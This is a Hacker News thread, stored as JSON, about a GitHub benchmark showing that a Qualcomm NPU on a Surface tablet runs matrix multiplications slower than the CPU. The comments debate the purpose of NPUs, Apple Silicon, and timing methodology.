[
  {
    "id": 41863061,
    "title": "AI PCs Aren't Good at AI: The CPU Beats the NPU",
    "originLink": "https://github.com/usefulsensors/qc_npu_benchmark",
    "originBody": "Benchmarking Qualcomm's NPU on the Microsoft Surface Tablet TL;DR - We see 1.3% of Qualcomm's NPU 45 Teraops/s claim when benchmarking Windows AI PCs Introduction Installation Python Cmake Visual Studio Pip Packages Benchmark Running Understanding the Output What the Benchmark Measures Possible Confounding Factors Compute Bound Power Settings Model Topology Configuration Errors Onnx Framework Interpreting the Results Introduction Microsoft now offers Surface tablets that run Windows on a Qualcomm Arm-based SoC. These are marketed as AI PCs, due to their ability to run machine learning models faster and more efficiently than other systems. We are fans of Qualcomm's hardware, and its NPU in particular, so we've invested a lot of time and resources into porting our third-party app to this plaform. Unfortunately there aren't many code examples or benchmarks available to demonstrate how to achieve fast results as an external developer, so we've put together a small standalone project to show the performance we're seeing. It's significantly below what we'd hoped for, so we're publishing this benchmark to see if we can get ideas on how to achieve lower latency. I'm hopeful there will be software changes, either at the application, framework, or driver level, that will improve these results in the future, since I've seen the underlying hardware perform very effectively on other platforms like Android. Installation Python We're using Python to run our test scripts, and on Windows there are several ways to install the language. As of October 2nd, 2024, the Python available on the Microsoft Store doesn't support the Arm architecture, and so it's not suitable for running the packages we need to access Qualcomm's NPU. Instead, you should use the official Python dot org installer. For the results reported here I used version 3.11.9. Cmake We'll also need the cmake build tool to compile Onnx (since prebuilt packages aren't yet available for Windows on Arm). To do this I ran the following command from a Powershell: winget install cmake Visual Studio The build process also requires Visual Studio for the compiler. Download Visual Studio Community Edition (not Code!) from visualstudio.microsoft.com/downloads/. During the installation you will be prompted to select Workload from several options: select Desktop C++ Development checkbox then press install. Pip Packages You can install all the required Python packages by running the following from within this folder: py -m pip install -r requirements.txt This includes a couple of custom packages. The first is my branch of Onnx, which has a fix for compiling using the official py launcher backported to Onnx version 1.16, since the Qualcomm Onnx Runtime doesn't work with newer Onnx versions (giving an Unsupported model IR version error). I also grab a nightly build of Qualcomm's Onnx Runtime package. If you want to install a more recent version, there's a list here. Benchmark Running To execute the benchmark, run: py benchmark_matmul.py Understanding the Output The Onnx runtime initially generates a lot of log spam, including: Error in cpuinfo: Unknown chip model name 'Snapdragon(R) X 12-core X1E80100 @ 3.40 GHz'. Please add new Windows on Arm SoC/chip support to arm/windows/init.c! unknown Qualcomm CPU part 0x1 ignored and Starting stage: Finalizing Graph Sequence Completed stage: Finalizing Graph Sequence (115919 us) Starting stage: Completion Completed stage: Completion (1025 us) After all those messages, you should see the actual benchmark results at the end, something like this: ************ Benchmark Results ************ NPU quantized compute, float I/O accuracy difference is 0.0100 NPU quantized compute and I/O accuracy difference is 0.0060 CPU took 8.42ms, 821,141,860,688 ops per second NPU (quantized compute, float I/O) took 30.63ms, 225,667,671,183 ops per second NPU (quantized compute and I/O) took 12.05ms, 573,475,650,364 ops per second The first two lines confirm that the numerical results of the operations match between the CPU and the NPU. The final three show the latency of the three approaches to running a simple model. The latency is the wall time it took to execute the model from start to finish, and the ops per second is calculated from that latency to indicate the equivalent computational throughput. In this example, we see the CPU is capable of running 821 billion ops/second (821 Gigaops), the first NPU approach gives us 225 Gigaops, and the second 573 Gigaops. What the Benchmark Measures This benchmark is designed to resemble some real world models we depend on, running 6 large matrix multiplications that are similar to the most time-consuming layers in transformer models like OpenAI's Whisper. The shapes are (6, 1500, 256) X (6, 256, 1500), producing a (6, 1500, 1500) result. The model we running consists of a single MatMul node with two inputs and one output. The models are created on the fly using the Onnx model framework, and then fed into the Onnx runtime. The control model is a pure float version that runs entirely on the CPU. The NPU mostly requires quantized models to run effectively (though it has limited support for float16). The first approach we took to quantization used the official ORT quantize_static() method. For convenience this leaves the input and output tensors in 32-bit float and performs runtime conversions at the start and end of the graph so that the rest of the computation happens in eight-bit. Unfortunately we discovered that the conversion operations as implemented on the NPU were extremely slow, much slower than the main matrix multiplication in fact. You can see the results in the npu_quant_profile.csv file in this repository, with conversions taking over 75% of the time. To work around this, we constructed an equivalent model graph programmatically with eight-bit inputs and outputs This is the second \"quantized compute and I/O\" approach mentioned in the results. This is usually around three times faster than the float I/O version, and profiling shows most of the time is going on the matrix multiplication, as we'd hope. Possible Confounding Factors There are a lot of variables involved in measuring performance. Here are some of the assumptions we've made: Compute Bound Modern transformer models are based around large matrix multiplications, unlike older convolutional models. One potential issue is that accelerators could become memory bound if the layers start to resemble matrix times vectors, since that doesn't allow reuse of many of the weights, and performance becomes bottle necked on fetching values from DRAM. We've tried to avoid that by making both the input matrices more square, so that tiling and reuse should be possible. The original matrices from the tiny Whisper model had a k dimension of only 64, so in case that was too small we bumped it up to 256 in this benchmark to give as much room for SIMD optimizations as possible. Power Settings Windows has a lot of different configuration options around energy usage, so we tried to ensure that all of the settings were on \"Best Performance\" and that we ran the benchmark with the tablet connected to mains power. There's also a session option on the Qualcomm Onnx Runtime, htp_performance_mode, that we set to sustained_high_performance, since that seemed to give the lowest overall latency in our experiments. Model Topology We wanted to create a graph of operations that reflected modern AI models, but was simple enough to easily interpret. We could have added multiple layers, or used convolutions, or static weights, but settled for a single matrix multiplication operation with dynamic inputs, since that reflected the transformer architectures that are widely used for LLMs and other modern models. Configuration Errors It's possible that the way we build and run our models causes them to fall off the fast path of the drivers or accelerator implementation. For example, we're using unsigned eight-bit quantization, with qdq elements in the graph. We've attempted to follow best practice from the documentation, but we'd welcome ways to improve performance, especially since these would improve the performance of our actual applications. Onnx Framework There are multiple different ways to access AI acceleration on Windows. We looked at DirectML, but it only seems to support GPU access. OpenVino doesn't run on our Arm hardware, as far as we can tell. We've seen similar performance results to those shown here using the Qualcomm QNN SDK directly. TensorFlow Lite isn't supported on Windows for Arm. From this research and our experiments, Onnx is supported by both Microsoft and Qualcomm, and seems to be the best framework to use to get accelerated performance from the NPU, but we're interested in learning if other APIs would be more appropriate. Interpreting the Results The results shown here are current as of October 2nd, 2024, when running on a Microsoft Surface Pro 11th Edition, with a Snapdragon(R) X 12-core X1E80100 clocked at 3.40 GHz. The first obvious thing is that the NPU results, even without float conversion, are slower than the CPU. This is not ideal for an accelerator, even though it could still potentially offer energy or sustained performance advantages that make it worth using. The second conclusion is that the measured performance of 573 billion operations per second is only 1.3% of the 45 trillion ops/s that the marketing material promises. By contrast, running the same model on an Nvidia Geforce RTX 4080 Laptop GPU runs in 3.2ms, an equivalent of 2,160 billion operations per second, almost four times the throughput.",
    "commentLink": "https://news.ycombinator.com/item?id=41863061",
    "commentBody": "AI PCs Aren't Good at AI: The CPU Beats the NPU (github.com/usefulsensors)460 points by dbreunig 23 hours agohidepastfavorite264 comments isusmelj 22 hours agoI think the results show that just in general the compute is not used well. That the CPU took 8.4ms and GPU took 3.2ms shows a very small gap. I'd expect more like 10x - 20x difference here. I'd assume that the onnxruntime might be the issue. I think some hardware vendors just release the compute units without shipping proper support yet. Let's see how fast that will change. Also, people often mistake the reason for an NPU is \"speed\". That's not correct. The whole point of the NPU is rather to focus on low power consumption. To focus on speed you'd need to get rid of the memory bottleneck. Then you end up designing your own ASIC with it's own memory. The NPUs we see in most devices are part of the SoC around the CPU to offload AI computations. It would be interesting to run this benchmark in a infinite loop for the three devices (CPU, NPU, GPU) and measure power consumption. I'd expect the NPU to be lowest and also best in terms of \"ops/watt\" reply AlexandrB 22 hours agoparent> Also, people often mistake the reason for an NPU is \"speed\". That's not correct. The whole point of the NPU is rather to focus on low power consumption. I have a sneaking suspicion that the real real reason for an NPU is marketing. \"Oh look, NVDA is worth $3.3T - let's make sure we stick some AI stuff in our products too.\" reply pclmulqdq 14 hours agorootparentThe correct way to make a true \"NPU\" is to 10x your memory bandwidth and feed a regular old multicore CPU with SIMD/vector instructions (and maybe a matrix multiply unit). Most of these small NPUs are actually made for CNNs and other models where \"stream data through weights\" applies. They have a huge speedup there. When you stream weights across data (any LLM or other large model), you are almost certain to be bound by memory bandwidth. reply sounds 2 hours agorootparentApple Silicon is surprisingly a good approach here - * On CPU: SIMD NEON * On CPU: custom matrix multiply accelerator, separate from SIMD unit * On CPU package: NPU * GPU Then they go and hide it all in proprietary undocumented features and force you to use their framework to access it :c reply bee_rider 12 hours agorootparentprevI’m sure we’ll get GPNPU. Low precision matvecs could be fun to play with. reply touisteur 8 hours agorootparentSHAVE from MOVIDIUS was fun, before Intel bought them out. reply hedgehog 3 hours agorootparentDid they become un-fun? There are a bunch on the new Intel CPUs. reply Spooky23 16 hours agorootparentprevnext [23 more] Microsoft needs to throw something in the gap to slow down MacBook attrition. The M processors changed the game. My teams support 250k users. I went from 50 MacBooks in 2020 to over 10,000 today. I added zero staff - we manage them like iPhones. reply pjmlp 13 hours agorootparentMicrosoft has indeed a problem, however only in countries whose people can afford Apple level prices, and not everyone is a G7 citizen. reply jocaal 12 hours agorootparentMicrosoft is slowly being squeezed from both sides of the market. Chromebooks have silently become wildly popular on the low end. The only advantage I see windows have is corporate and gaming. But valve is slowly chopping away at the gaming advantage as well. reply pjmlp 12 hours agorootparentChromebooks are no where to be seen outside US school market. Coffe shops, trains and airports in Europe? Nope, rare animal on tables. European schools? Most countries parents buy their kids a computer, and most often it is a desktop used by the whole family, or a laptop of some kind running Windows, unless we are talking about the countries where buying Apple isn't an issue on the monthly expenses. Popular? In Germany, the few times they get displayed on shopping mall stores, they get rountinely discounted, or bundled with something else, until finally they get rid of them. Valve is heavily dependent on game studios producing Windows games. reply cj 15 hours agorootparentprevRightly so. The M processor really did completely eliminate all sense of “lag” for basic computing (web browsing, restarting your computer, etc). Everything happens nearly instantly, even on the first generation M1 processor. The experience of “waiting for something to load” went away. Not to mention these machines easily last 5-10 years. reply morsch 12 hours agorootparentIt's fine. For basic computing, my M3 doesn't feel much faster than my Linux desktop that's like 8 years old. I think the standard for laptops was just really, really low. reply thanksgiving 8 hours agorootparent> I think the standard for laptops was just really, really low. As someone who used windows laptops, I was amazed when I saw someone sitting next to me on a public transit subway on her MacBook Pro editing images on photoshop with just her trackpad. The standard for windows laptops used to be that low (about ten or twelve years ago?) that seeing a MacBook trackpad just woke someone is a part of my permanent memory. reply thesuitonym 5 hours agorootparentI don't understand the hype around Apple trackpads. 15 years ago, sure, there was a huge gulf of difference, but today? The only difference that I can see or fee, at least between lenovo or dell and apple, is that the mac trackpad is physically larger. reply nxobject 15 hours agorootparentprevAs a very happy M1 Max user (should've shelled out for 64GB of RAM, though, for local LLMs!), I don't look forward to seeing how the Google Workspace/Notions/etc. of the world somehow reintroduce lag back in. reply bugbuddy 14 hours agorootparentThe problem for Intel and AMD is they are stuck with an OS that ships with a lag-inducing Anti-malware suite. I just did a simple git log and it took 2000% longer than usual because the Antivirus was triggered to scan and run a simulation on each machine instruction and byte of data accessed. The commit log window stayed blank waiting to load long enough for me to complete another tiny project. It always ruin my day. reply alisonatwork 13 hours agorootparentPro tip: turn off malware scanning in your git repos[0]. There is also the new Dev Drive feature in Windows 11 that makes it even easier for developers (and IT admins) to set this kind of thing up via policies[1]. In companies where I worked where the IT team rolled out \"security\" software to the Mac-based developers, their computers were not noticeably faster than Windows PCs at all, especially given the majority of containers are still linux/amd64, reflecting the actual deployment environment. Meanwhile Windows also runs on ARM anyway, so it's not really something useful to generalize about. [0] https://support.microsoft.com/en-us/topic/how-to-add-a-file-... [1] https://learn.microsoft.com/en-us/windows/dev-drive/ reply bugbuddy 13 hours agorootparentUnfortunately, the IT department people think they are literal GODs for knowing how to configure Domain Policies and lock down everything. They even refuse to help or even answer requests for help when there are false positives on our own software builds that we cannot unmark as false positives. These people are proactively antagonistic to productivity. Management could not careless… reply thesuitonym 5 hours agorootparentThey don't think they're gods, they just think you're an idiot. This is not to say that you are, or even that they believe YOU individually are an idiot, it's just that users are idiots. There are also insurance, compliance, and other constraints that IT folks have that make them unwilling to turn off scanning for you. reply xxs 52 minutes agorootparentthey are allowed to do that for the folks that produce the goods of course, it just makes a lot harder to retain the said idiots. reply lynx23 11 hours agorootparentprevNobody wants to be resonsible for giving allowing exceptions in security-matters. Its far easier to ignore the problems at hand, then to risk being wrong just once. reply xxs 12 hours agorootparentprevthe short answer is that you can't without the necessary permissions, and even if you do - the next roll out will wipe out your changes. So the pro-part of the tip does not apply. On my own machines anti-virus is one the very first things to be removed. Most of the time I'd turn off all the swap file, yet Windows doesn't overcommit and certain applications are notorious for allocating memory w/o even using it. reply zdw 13 hours agorootparentprevThis is most likely due to corporate malware. Even modern macs can be brought to their knees by something that rhymes with FrowdStrike Calcon and interrupts all IO. reply djur 13 hours agorootparentprevOh, just work for a company that uses Crowdstrike or similar. You'll get back all the lag you want. reply n8cpdx 13 hours agorootparentprevChrome managed it. Not sure how since Edge still works reasonably well and Safari is instant to start (even faster than system settings, which is really an indictment of SwiftUI). reply bzzzt 13 hours agorootparentprevDepends on the application as well. Just try to start up Microsoft Teams. reply ddingus 14 hours agorootparentprevI have a first gen M1 and it holds up very nicely even today. I/O is crazy fast and high compute loads get done efficiently. One can bury the machine and lose very little basic interactivity. That part users really like. Frankly the only downside of the MacBook Air is the tiny storage. The 8GB RAM is actually enough most of the time. But general system storage with only 1/4 TB is cramped consistently. Been thinking about sending the machine out to one of those upgrade shops... reply lynguist 13 hours agorootparentWhy did you buy a 256GB device for personal use in the first place? Too good of a deal? Or saving these $400 for upgrades for something else? reply 112233 9 hours agorootparentNot OP, but by booting M1 from external thunderbolt nvme you lose less than 50% of benchmark disk throughput (3GB/s is still ridiculously fast), can buy 8TB drive for less than 1k, plus can boot it on another M1 mac if something happens. If there was \"max mem, min disk\" model, would def get that. reply shermantanktop 4 hours agorootparentprevThat’s how we got an explosion of interesting hardware in the early 80s - hardware companies attempting to entice consumers by claiming “blazing 16 bit speeds” or other nonsense. It was a marketing circus but it drove real investments and innovation over time. I’d hope the same could happen here. reply itishappy 22 hours agorootparentprevnext [23 more] I assume you're both right. I'm sure NPUs exist to fill a very real niche, but I'm also sure they're being shoehorned in everywhere regardless of product fit because \"AI big right now.\" reply wtallis 20 hours agorootparentLooking at it slightly differently: putting low-power NPUs into laptop and phone SoCs is how to get on the AI bandwagon in a way that NVIDIA cannot easily disrupt. There are plenty of systems where a NVIDIA discrete GPU cannot fit into the budget (of $ or Watts). So even if NPUs are still somewhat of a solution in search of a problem (aka a killer app or two), they're not necessarily a sign that these manufacturers are acting entirely without strategy. reply brookst 16 hours agorootparentprevThe shoehorning only works if there is buyer demand. As a company, if customers are willing to pay a premium for a NPU, or if they are unwilling to buy a product without one, it is not your place to say “hey we don’t really believe in the AI hype so we’re going to sell products people don’t want to prove a point” reply MBCook 16 hours agorootparentIs there demand? Or do they just assume there is? If they shove it in every single product and that’s all anyone advertises, whether consumers know it will help them or not, you don’t get a lot of choice. If you want the latest chip, you’re getting AI stuff. That’s all there is to it. reply Terr_ 15 hours agorootparent\"The math is clear: 100% of our our car sales come from models with our company logo somewhere on the front, which shows incredible customer desire for logos. We should consider offering a new luxury trim level with more of them.\" \"How many models to we have without logos?\" \"Huh? Why would we do that?\" reply MBCook 15 hours agorootparentHeh. Yeah more or less. To some degree I understand it, because as we’ve all noticed computers have pretty much plateaued for the average person. They last much longer. You don’t need to replace them every two years anymore because the software isn’t out stripping them so fast. AI is the first thing to come along in quite a while that not only needs significant power but it’s just something different. It’s something they can say your old computer doesn’t have that the new one does. Other than being 5% faster or whatever. So even if people don’t need it, and even if they notice they don’t need it, it’s something to market on. The stuff up thread about it being the hotness that Wall Street loves is absolutely a thing too. reply ddingus 14 hours agorootparentThat was all true nearly 10 years ago. And it has only improved. Almost any computer one finds these days is capable of the basics. reply bdd8f1df777b 16 hours agorootparentprevThere are two kinds of buyer demands: product, buyers, and the stock buyers. The AI hype can certainly convince some of the stock buyers. reply Spooky23 16 hours agorootparentprevApple will have a completely AI capable product line in 18 months, with the major platforms basically done. Microsoft is built around the broken Intel tick/tick model of incremental improvement — they are stuck with OEM shitware that will take years to flush out of the channel. That means for AI, they are stuck with cloud based OpenAI, where NVIDIA has them by the balls and the hyperscalers are all fighting for GPU. Apple will deliver local AI features as software (the hardware is “free”) at a much higher margin - while Office 365 AI is like $400+ a year per user. You’ll have people getting iPhones to get AI assisted emails or whatever Apple does that is useful. reply hakfoo 14 hours agorootparentWe're still looking for \"that is useful\". The stuff they've been trying to sell AI to the public with is increasingly looking as absurd as every 1978 \"you'll store your recipes on the home computer\" argument. AI text became a Human Centipede story: Start with a coherent 10-word sentence, let AI balloon it into five pages of flowery nonsense, send it to someone else, who has their AI smash it back down to 10 meaningful words. Coding assistance, even as spicy autocorrect, is often a net negative as you have to plow through hallucinations and weird guesses as to what you want but lack the tools to explain to it. Image generation is already heading rapidly into cringe territory, in part due to some very public social media operations. I can imagine your kids' kids in 2040 finding out they generated AI images in the 2020s and looking at them with the same embarrassment you'd see if they dug out your high-school emo fursona. There might well be some more \"closed-loop\" AI applications that make sense. But are they going to be running on every desktop in the world? Or are they going to be mostly used in datacentres and purpose-built embedded devices? I also wonder how well some of the models and techniques scale down. I know Microsoft pushed a minimum spec to promote a machine as Copilot-ready, but that seems like it's going to be \"Vista Basic Ready\" redux as people try to run tools designed for datacentres full of Quadro cards, or at least high-end GPUs, on their $299 HP laptop. reply jjmarr 14 hours agorootparentCringe emo girls are trendy now because the nostalgia cycle is hitting the early 2000s. Your kid would be impressed if you told them you were a goth gf. It's not hard to imagine the same will happen with primitive AIs in the 40s. reply defrost 13 hours agorootparentEarly 2000's ?? Bela Lugosi Died in 1979, and Peter Murphy was onto his next band by 1984. By 2000 Goth was fully a distant dot in the rear view mirror for the OG's In 2002, Murphy released *Dust* with Turkish-Canadian composer and producer Mercan Dede, which utilizes traditional Turkish instrumentation and songwriting, abandoning Murphy's previous pop and rock incarnations, and juxtaposing elements from progressive rock, trance, classical music, and Middle Eastern music, coupled with Dede's trademark atmospheric electronics. https://www.youtube.com/watch?v=Yy9h2q_dr9k https://en.wikipedia.org/wiki/Bauhaus_(band) reply djur 13 hours agorootparentI'm not sure what \"gothic music existed in the 1980s\" is meant to indicate as a response to \"goths existed in the early 2000s as a cultural archetype\". reply defrost 13 hours agorootparentThat Goths in 2000's were at best second wave nostalgia cycle of Goths from the 1980s. That people recalling Goths in that period should beware of thinking that was a source and not an echo. In 2006 Noel Fielding's Richmond Felicity Avenal was a basement dwelling leftover from many years past. reply bee_rider 12 hours agorootparentTrue Goth died our way before any of that. They totally sold out when the sacked Rome, the gold went to their heads and everything since then has been nostalgia. reply defrost 12 hours agorootparentThat was just the faux life Westside Visigoths .. what'd you expect? #Ostrogoth #TwueGoth reply carlob 12 hours agorootparentprevThere was a submission here a few months ago about the various incarnations of goth starting from the late Roman empire. https://www.the-hinternet.com/p/the-goths reply defrost 12 hours agorootparentWas there? This one: https://news.ycombinator.com/item?id=41232761 ? Nice: https://www.youtube.com/watch?v=VZvSqgn_Zf4 reply Spooky23 6 hours agorootparentprevThe product isn’t released, so I don’t think we know what is or isn’t good. People are clearly finding LLM tech useful, and we’re barely scratching the surface. reply HelloNurse 4 hours agorootparentprevI expect this sort of thing to go out of fashion and/or be regulated after \"AI\" causes some large life loss, e.g. starting a war or designing a collapsing building. reply nxobject 14 hours agorootparentprevI hope that once they get a baseline level of AI functionality in, they start working with larger LLMs to enable some form of RAG... that might be their next generational shift. reply justahuman74 14 hours agorootparentprevWho is getting $400/y of value from that? reply im3w1l 13 hours agorootparentprevUntil AI chips become abundant, and we are not there yet, cloud AI just makes too much sense. Using a chip constantly vs using it 0.1% of the time is just so many orders of magnitude better. Local inference does have privacy benefits. I think at the moment it might make sense to send most of queries to a beefy cloud model, and send sensitive queries to a smaller local one. reply conradev 15 hours agorootparentprevThe real consumers of the NPUs are the operating systems themselves. Google’s TPU and Apple’s ANE are used to power OS features like Apple’s Face ID and Google’s image enhancements. We’re seeing these things in traditional PCs now because Microsoft has demanded it so that Microsoft can use it in Windows 11. Any use by third party software is a lower priority reply kmeisthax 22 hours agorootparentprevnext [7 more] You forget \"Because Apple is doing it\", too. reply rjsw 20 hours agorootparentI think other ARM SoC vendors like Rockchip added NPUs before Apple, or at least around the same time. reply acchow 19 hours agorootparentI was curious so looked it up. Apple's first chip with an NPU was the A11 bionic in Sept 2017. Rockchip's was the RK1808 in Sept 2019. reply j16sdiz 17 hours agorootparentGoogle TPU was introduced around same time as apple. Basically everybody knew it can be something around that time, just don't know exactly how reply Someone 13 hours agorootparenthttps://en.wikipedia.org/wiki/Tensor_Processing_Unit#Product... shows the first one is from 2015 (publicly announced in 2016). It also shows they have a TDP of 75+W. I can’t find TDP for Apple’s Neural Engine (https://en.wikipedia.org/wiki/Neural_Engine), but the first version shipped in the iPhone 8, which has a 7 Wh battery, so these are targeting different markets. reply GeekyBear 18 hours agorootparentprevFace ID was the first tent pole feature that ran on the NPU. reply bdd8f1df777b 16 hours agorootparentprevEven if it were true, they wouldn’t have the same influence as Apple has. reply WithinReason 12 hours agorootparentprevyeah I'm not sure being 1% utilised helps power consumption reply Dalewyn 17 hours agorootparentprevnext [5 more] There are no nerves in a neural processing unit, so yes: It's 300% bullshit marketing. reply brookst 16 hours agorootparentNeural is an adjective. Adjectives do not require their associated nouns to be present. See also: digital computers have mo fingers at all. reply -mlv 16 hours agorootparentI always thought 'digital' referred to numbers, not fingers. reply bdd8f1df777b 16 hours agorootparentThe derivative meaning has been use so widely that it has surpassed its original one in usage. But it doesn’t change the fact that it originally refers to the fingers. reply jcgrillo 17 hours agorootparentprevMaybe the N secretly stands for NFT.. Like the tesla self driving hardware only smaller and made of silicon. reply theresistor 19 hours agoparentprev> Also, people often mistake the reason for an NPU is \"speed\". That's not correct. The whole point of the NPU is rather to focus on low power consumption. It's also often about offload. Depending on the use case, the CPU and GPU may be busy with other tasks, so the NPU is free bandwidth that can be used without stealing from the others. Consider AI-powered photo filters: the GPU is probably busy rendering the preview, and the CPU is busy drawing UI and handling user inputs. reply cakoose 18 hours agorootparentOffload only makes sense if there are other advantages, e.g. speed, power. Without those, wouldn't it be better to use the NPUs silicon budget on more CPU? reply mapt 7 hours agorootparentFor PC CPUs, there are already so many watts per square millimeter that many of the top tiers of the recent generations are running thermally throttled 24/7; More cooling improves performance rather than temperatures because it allows more of the cores to run at 'full' speed or at 'boost' speed. This kills their profitable market segmentation. In this environment it makes some sense to use more efficient RISC cores, and to spread out cores a bit with dedicated bits that either aren't going to get used all the time, or that are going to be used at lower power draws, and combining cores with better on-die memory availability (extreme L2/L3 caches) and other features. Apple even has some silicon in the power section left as empty space for thermal reasons. Emily (formerly Anthony) on LTT had a piece on the Apple CPUs that pointed out some of the inherent advantages of the big-chip ARM SOC versus the x86 motherboard-daughterboard arrangement as we start to hit Moore's Wall. https://www.youtube.com/watch?v=LFQ3LkVF5sM reply theresistor 17 hours agorootparentprevIf you know that you need to offload matmuls, then building matmul hardware is more area efficient than adding an entire extra CPU. Various intermediate points exist along that spectrum, e.g. Cell's SPUs. reply heavyset_go 18 hours agorootparentprevMore CPU means siphoning off more of the power budget on mobile devices. The theoretical value of NPUs is power efficiency on a limited budget. reply avianlyric 17 hours agorootparentprevNot really. To get extra CPU performance that likely means more cores, or some other general compute silicon. That stuff tends to be quite big, simply because it’s so flexible. NPUs focus on one specific type of computation, matrix multiplication, and usually with low precision integers, because that’s all a neural net needs. That vast reduction in flexibility means you can take lots of shortcuts in your design, allowing you cram more compute into a smaller footprint. If you look at the M1 chip[1], you can see the entire 16-Neural engine has a foot print about the size of 4 performance cores (excluding their caches). It’s not perfect comparison, without numbers on what the performance core can achieve in terms of ops/second vs the Neural Engine. But it seems reasonable to be that the Neural Engine and handily outperform the performance core complex when doing matmul operations. [1] https://www.anandtech.com/show/16226/apple-silicon-m1-a14-de... reply kmeisthax 22 hours agoparentprev> I think some hardware vendors just release the compute units without shipping proper support yet This is Nvidia's moat. Everything has optimized kernels for CUDA, and maybe Apple Accelerate (which is the only way to touch the CPU matrix unit before M4, and the NPU at all). If you want to use anything else, either prepare to upstream patches in your ML framework of choice or prepare to write your own training and inference code. reply noduerme 8 hours agorootparentI'm not sure why this is a moat. Isn't it just a matter of translation from CUDA to some other instruction set? If AMD or someone else makes cheaper hardware that does the same thing, it doesn't seem like a stretch for them to release a PyTorch patch or whatever. reply david-gpu 7 hours agorootparentMost of the computations are done inside NVidia proprietary libraries, not open-source CUDA. And if you saw what goes inside those libraries, I think you would agree that it is a substantial moat. reply theGnuMe 3 hours agorootparentThere are clean room approaches like AMDs and Scale. reply caeril 2 hours agorootparentGeohot has multiple (and ongoing) rants about the sheer instability of AMD RDNA3 drivers. Lisa Su engaged directly with him on this, and she didn't seem to give a shit about their problems. AMD is not taking ML applications seriously, outside of their marketing hype. reply blharr 3 hours agorootparentprevSure you can probably translate rough code and get something that \"works\" but all the thousands of small optimizations that are baked in are not trivial to just translate. reply spookie 19 hours agoparentprevI've been building an app in pure C using onnxruntime, and it outperforms a comparable one done with python by a substancial amount. There are many other gains to be made. (In the end python just calls C, but it's pretty interesting how much performance is lost) reply dacryn 10 hours agorootparentagree there, but then again using ort in Rust is faster again. You cannot compare python with a onxx executor. I don't know what you used in Python, but if it's pytorch or similar, those are built with flexibility in mind, for optimal performance you want to export those to onxx and use whatever executor that is optimized for your env. onxxruntime is one of them, but definitely not the only one, and given it's from Microsoft, some prefer to avoid it and choose among the many free alternatives. reply rerdavies 10 hours agorootparentWhy would the two not be entirely comparable? PyTorch may be slower at building the models; but once the model is compiled and loaded on the NPU, there's just not a whole lot of Python involved anymore. A few hundred CPU cycles to push the input data using python; a few hundred CPU cycles to receive the results using python. And everything in-between gets executed on the NPU. reply noduerme 8 hours agorootparentI really wish Python wasn't the language controlling all the C code. You need a controller, in a scripting language that's easy to modify, but it's a rather hideous choice. It would be like choosing to build the world's largest social network in PHP or something. lol. reply robertlagrant 8 hours agorootparent> it's a rather hideous choice Why? reply godelski 19 hours agoparentprevThey definitely aren't doing the timing properly, but also what you might think is timing is not what is generally marketed. But I will say, those marketed versions are often easier to compare. One such example is that if you're using GPU then have you actually considered that there's an asynchronous operation as part of your timing? If you're naively doing `time.time()` then what happens is this start = time.time() # cpu records time pred = model(input.cuda()).cuda() # push data and model (if not already there) to GPU memory and start computation. This is asynchronous end = time.time() # cpu records time, regardless of if pred stores data You probably aren't expecting that if you don't know systems and hardware. But python (and really any language) is designed to be smart and compile into more optimized things than what you actually wrote. There's no lock, and so we're not going to block operations for cpu tasks. You might ask why do this? Well no one knows what you actually want to do. And do you want the timer library now checking for accelerators (i.e. GPU) every time it records a time? That's going to mess up your timer! (at best you'd have to do a constructor to say \"enable locking for this accelerator\") So you gotta do something a bit more nuanced. If you want to actually time GPU tasks, you should look at cuda event timers (in pytorch this is `torch.cuda.Event(enable_timing=True)`. I have another comment with boilerplate) Edit: There's also complicated issues like memory size and shape. They definitely are not being nice to the NPU here on either of those. They (and GPUs!!!) want channels last. They did [1,6,1500,1500] but you'd want [1,1500,1500,6]. There's also the issue of how memory is allocated (and they noted IO being an issue). 1500 is a weird number (as is 6) so they aren't doing any favors to the NPU, and I wouldn't be surprised that this is a surprisingly big hit considering how new these things are And here's my longer comment with more details: https://news.ycombinator.com/item?id=41864828 reply artemisart 18 hours agorootparentImportant precision: the async part is absolutely not python specific, but comes from CUDA, indeed for performance, and you will have to use cuda events too in C++ to properly time it. For ONNX the runtimes I know of are synchronous as we don't do each operation individually but whole models at once, there is no need for async, the timings should be correct. reply godelski 17 hours agorootparentYes, it isn't python, it is... hardware. Not even CUDA specific. It is about memory moving around and optimization (remember, even the CPUs do speculative execution). I say a little more in the larger comment. I'm less concerned about the CPU baseline and more concerned about the NPU timing. Especially given the other issues reply fennecfoxy 5 hours agoparentprevI think it's definitely possibly now (or very soon) for an LLM to write native GPU/NPU code to get itself to run on different hardware. reply hulitu 3 hours agoparentprev> The whole point of the NPU is rather to focus on low power consumption You know which chip has the lowest power consumption ? The one which is turned off. /s reply jsheard 22 hours agoprevThese NPUs are tying up a substantial amount of silicon area so it would be a real shame if they end up not being used for much. I can't find a die analysis of the Snapdragon X which isolates the NPU specifically but AMDs equivalent with the same ~50 TOPS performance target can be seen here, and takes up about as much area as three high performance CPU cores: https://www.techpowerup.com/325035/amd-strix-point-silicon-p... reply ezst 21 hours agoparentI can't wait for the LLM fad to be over so we get some sanity (and efficiency) back. I personally have no use for this extra hardware (\"GenAI\" doesn't help me in any way nor supports any work-related tasks). Worse, most people have no use for that (and recent surveys even show predominant hostility towards AI creep). We shouldn't be paying extra for that, it should be opt-in, and then it would become clear (by looking at the sales and how few are willing to pay a premium for \"AI\") how overblown and unnecessary this is. reply kalleboo 17 hours agorootparent> most people have no use for that Apple originally added their NPUs before the current LLM wave to support things like indexing your photo library so that objects and people are searchable. These features are still very popular. I don't think these NPUs are fast enough for GenAI anyway. reply wmf 16 hours agorootparentMS Copilot and \"Apple Intelligence\" are running a small language model and image generation on the NPU so that should count as \"GenAI\". reply kalleboo 14 hours agorootparentIt's still in beta so we'll see how things go but I saw someone testing what Apple Intelligence ran on-device vs sent off to the \"private secure cloud\" and even stuff like text summaries were being sent to the cloud. reply grugagag 16 hours agorootparentprevI wish I could turn that off on my phone. reply mardifoufs 18 hours agorootparentprevNPUs were a thing (and a very common one in mobile CPUs too) way before the LLM craze. reply jcgrillo 17 hours agorootparentprevI just got an iphone and the whole photos thing is absolutely garbage. All I wanted to do was look through my damn photos and find one I took recently but it started playing some random music and organized them in no discernible order.. like it wasn't the reverse time sorted.. Idk what kind of fucked up \"creative process\" came up with that bullshit but I sure wish they'd unfuck it stat. The camera is real good though. reply nioj 1 hour agorootparentI think the music part is related to the setting called \"Show Featured Content\" in the Photos app settings. reply james_marks 15 hours agorootparentprevThere’s an album called “Recents” that’s chronological and scrolled to the end. “Recent” seems to mean everything; I’ve got 6k+ photos, I think since the last fresh install, which is many devices ago. Sounds like the 